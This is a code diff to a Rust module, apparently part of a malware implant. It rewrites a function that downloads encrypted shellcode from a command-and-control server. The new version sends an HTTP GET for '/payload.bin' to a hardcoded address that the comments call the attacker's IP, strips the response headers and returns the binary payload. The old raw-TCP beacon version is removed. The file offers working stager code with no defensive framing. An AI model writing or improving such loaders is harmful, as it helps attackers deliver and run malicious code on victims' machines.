@@ -1,18 +1,22 @@
-use std::net::{TcpStream};
 use std::io::{Read, Write};
-use crate::encryption;
+use std::net::TcpStream;
 
-pub fn fetch_payload_from_c2(ip: &str, port: u16, key: &[u8; 16], nonce: &[u8; 16]) -> Vec<u8> {
-    let mut stream = TcpStream::connect((ip, port)).expect("Failed to connect to C2");
+/// Fetches encrypted shellcode from an HTTP server
+pub fn fetch_encrypted_payload() -> Vec<u8> {
+    let server_ip = "10.0.0.86:8080"; // Change this to your attacker's IP
+    let payload_path = "/payload.bin";
+    
+    let mut stream = TcpStream::connect(server_ip).expect("Failed to connect to C2 server");
 
-    // Send a beacon signal
-    stream.write_all(b"BEACON").expect("Failed to send beacon");
+    // Send an HTTP GET request
+    let request = format!("GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", payload_path, server_ip);
+    stream.write_all(request.as_bytes()).expect("Failed to send HTTP request");
 
-    // Receive encrypted payload
-    let mut buffer = vec![0; 4096];
-    let len = stream.read(&mut buffer).expect("Failed to receive data");
-    buffer.truncate(len);
+    // Read the response
+    let mut response = Vec::new();
+    stream.read_to_end(&mut response).expect("Failed to read response");
 
-    // Decrypt and return the shellcode
-    encryption::decrypt_shellcode(&buffer, key, nonce)
+    // Strip HTTP headers
+    let payload_start = response.windows(4).position(|w| w == b"\r\n\r\n").unwrap_or(0) + 4;
+    response[payload_start..].to_vec() // Return only the binary payload
 }
